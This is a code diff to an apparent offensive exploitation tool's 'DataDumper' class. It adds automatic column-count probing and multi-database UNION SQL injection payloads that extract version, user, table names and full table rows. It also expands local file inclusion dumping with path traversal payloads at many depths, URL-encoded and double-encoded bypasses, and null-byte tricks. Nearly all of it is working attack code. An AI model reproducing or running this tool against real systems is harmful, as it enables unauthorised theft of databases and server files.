@@ -69,19 +69,32 @@ class DataDumper:
     
     def _get_db_info(self, url: str, param: str, db_type: str) -> dict:
         """Get database information"""
+        # Dynamically detect column count via ORDER BY probing
+        num_cols = self._detect_column_count(url, param)
+        if num_cols < 1:
+            num_cols = self._DEFAULT_COLUMN_COUNT
+
+        # Build column padding (fill extra positions with NULL-like values)
+        def _pad(needed_cols, *values):
+            """Build a UNION fragment: inject *values* then pad with integers."""
+            parts = list(values)
+            while len(parts) < needed_cols:
+                parts.append(str(len(parts) + 1))
+            return ','.join(parts[:needed_cols])
+
         queries = {
             'mysql': [
-                "' UNION SELECT @@version,user(),database(),4,5 --",
-                "' UNION SELECT version(),current_user(),database(),4,5 --",
+                f"' UNION SELECT {_pad(num_cols, '@@version', 'user()', 'database()')} --",
+                f"' UNION SELECT {_pad(num_cols, 'version()', 'current_user()', 'database()')} --",
             ],
             'postgresql': [
-                "' UNION SELECT version(),current_user,current_database(),4,5 --",
+                f"' UNION SELECT {_pad(num_cols, 'version()', 'current_user', 'current_database()')} --",
             ],
             'mssql': [
-                "' UNION SELECT @@version,SYSTEM_USER,DB_NAME(),4,5 --",
+                f"' UNION SELECT {_pad(num_cols, '@@version', 'SYSTEM_USER', 'DB_NAME()')} --",
             ],
             'oracle': [
-                "' UNION SELECT (SELECT banner FROM v$version WHERE rownum=1),user,global_name,4,5 FROM global_name --",
+                f"' UNION SELECT {_pad(num_cols, '(SELECT banner FROM v$version WHERE rownum=1)', 'user', 'global_name')} FROM global_name --",
             ],
         }
         
@@ -100,14 +113,46 @@ class DataDumper:
                     print(f"{Colors.error(f'DB info error: {e}')}")
         
         return None
+
+    # Error keywords that indicate an ORDER BY column index is out of range.
+    _ORDER_BY_ERROR_KW = ('error', 'unknown column', 'order by',
+                          'sqlstate', 'syntax')
+
+    # Fallback column count when probing fails (common in simple tables).
+    _DEFAULT_COLUMN_COUNT = 5
+
+    def _detect_column_count(self, url: str, param: str, max_cols: int = 20) -> int:
+        """Detect the number of columns via ORDER BY probing."""
+        for n in range(1, max_cols + 1):
+            try:
+                payload = f"' ORDER BY {n} --"
+                data = {param: payload}
+                response = self.requester.request(url, 'POST', data=data)
+                if response:
+                    text = response.text.lower()
+                    if any(kw in text for kw in self._ORDER_BY_ERROR_KW):
+                        return n - 1
+            except Exception:
+                continue
+        return 0
     
     def _get_tables(self, url: str, param: str, db_type: str) -> list:
         """Get database tables"""
+        num_cols = self._detect_column_count(url, param)
+        if num_cols < 1:
+            num_cols = self._DEFAULT_COLUMN_COUNT
+
+        def _pad(needed, val):
+            parts = [val]
+            while len(parts) < needed:
+                parts.append(str(len(parts) + 1))
+            return ','.join(parts[:needed])
+
         queries = {
-            'mysql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database() --",
-            'postgresql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema='public' --",
-            'mssql': "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --",
-            'oracle': "' UNION SELECT table_name,2,3,4,5 FROM user_tables --",
+            'mysql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables WHERE table_schema=database() --",
+            'postgresql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables WHERE table_schema='public' --",
+            'mssql': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM information_schema.tables --",
+            'oracle': f"' UNION SELECT {_pad(num_cols, 'table_name')} FROM user_tables --",
         }
         
         query = queries.get(db_type, queries['mysql'])
@@ -128,16 +173,34 @@ class DataDumper:
     
     def _dump_table(self, url: str, param: str, db_type: str, table: str, columns: list) -> list:
         """Dump table data"""
+        num_cols = self._detect_column_count(url, param)
+        if num_cols < 1:
+            num_cols = self._DEFAULT_COLUMN_COUNT
+
+        # Build column expression – use CONCAT/|| to merge requested
+        # columns into fewer UNION positions when there are more columns
+        # requested than available injection positions.
         col_str = ','.join(columns)
-        
-        queries = {
-            'mysql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
-            'postgresql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
-            'mssql': f"' UNION SELECT {col_str},4,5 FROM {table} --",
-            'oracle': f"' UNION SELECT {col_str},4,5 FROM {table} --",
-        }
-        
-        query = queries.get(db_type, queries['mysql'])
+        needed = len(columns)
+        if needed >= num_cols:
+            # Merge all into one concat field and pad
+            if db_type == 'mssql':
+                concat_col = " + ',' + ".join(f"CAST({c} AS VARCHAR)" for c in columns)
+            elif db_type == 'oracle':
+                concat_col = " || ',' || ".join(columns)
+            else:
+                concat_col = f"CONCAT_WS(',', {col_str})"
+            parts = [concat_col]
+            while len(parts) < num_cols:
+                parts.append(str(len(parts) + 1))
+            select_expr = ','.join(parts[:num_cols])
+        else:
+            parts = list(columns)
+            while len(parts) < num_cols:
+                parts.append(str(len(parts) + 1))
+            select_expr = ','.join(parts[:num_cols])
+
+        query = f"' UNION SELECT {select_expr} FROM {table} --"
         
         try:
             data = {param: query}
@@ -175,17 +238,30 @@ class DataDumper:
         ]
         
         for file_path in files_to_dump:
-            try:
-                data = {param: f"../../../{file_path}"}
-                response = self.requester.request(url, 'GET', data=data)
-                
-                if response and len(response.text) > 10:
-                    self._save_dump(file_path.replace('/', '_'), response.text)
-                    print(f"{Colors.success(f'Dumped: {file_path}')}")
+            # Try multiple traversal depths and bypass techniques
+            payloads = []
+            for depth in range(1, 11):
+                payloads.append(f'{"../" * depth}{file_path}')
+            for depth in (3, 5, 7):
+                payloads.append(f'{"....//....//" * depth}{file_path}')
+                payloads.append(f'{"..%2f" * depth}{file_path}')
+                payloads.append(f'{"..%252f" * depth}{file_path}')
+                payloads.append(f'{"../" * depth}{file_path}%00')
+            payloads.append(file_path)  # direct/absolute
+
+            for payload in payloads:
+                try:
+                    data = {param: payload}
+                    response = self.requester.request(url, 'GET', data=data)
                     
-            except Exception as e:
-                if self.engine.config.get('verbose'):
-                    print(f"{Colors.error(f'LFI dump error: {e}')}")
+                    if response and len(response.text) > 10:
+                        self._save_dump(file_path.replace('/', '_'), response.text)
+                        print(f"{Colors.success(f'Dumped: {file_path}')}")
+                        break
+                        
+                except Exception as e:
+                    if self.engine.config.get('verbose'):
+                        print(f"{Colors.error(f'LFI dump error: {e}')}")
     
     def _dump_ssrf_metadata(self, finding):
         """Dump cloud metadata"""
